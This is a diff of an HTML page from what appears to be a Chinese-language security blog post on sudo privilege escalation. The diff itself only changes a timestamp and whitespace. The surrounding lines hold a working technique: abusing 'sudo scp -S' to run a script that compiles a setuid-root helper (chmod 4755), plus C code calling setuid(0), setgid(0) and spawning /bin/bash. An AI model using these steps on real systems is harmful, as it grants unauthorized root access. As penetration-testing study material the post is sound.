@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Fxven Blog">
 <meta property="og:description" content="Sudo Privilege Escalation">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-20T10:31:03.160Z">
+<meta property="og:updated_time" content="2019-04-20T10:33:01.453Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sudo提权">
 <meta name="twitter:description" content="Sudo Privilege Escalation">
@@ -377,7 +377,7 @@
 <li><strong>scp</strong><br><code>sudo scp -S /tmp/script.sh x y:</code><br>&ensp;<strong>shell.sh</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">gcc /tmp/shell.c -o /tmp/shell &amp;&amp; chmod 4755 /tmp/shell</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>script.sh</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">setuid(0);</span><br><span class="line">setgid(0);</span><br><span class="line">system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>script.sh</strong><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">setuid(0);</span><br><span class="line">setgid(0);</span><br><span class="line">system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <hr>
 <h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
 <li><a href="https://touhidshaikh.com/blog/?p=790" target="_blank" rel="noopener">Abusing SUDO (Linux Privilege Escalation) - Touhid M.Shaikh</a></li>
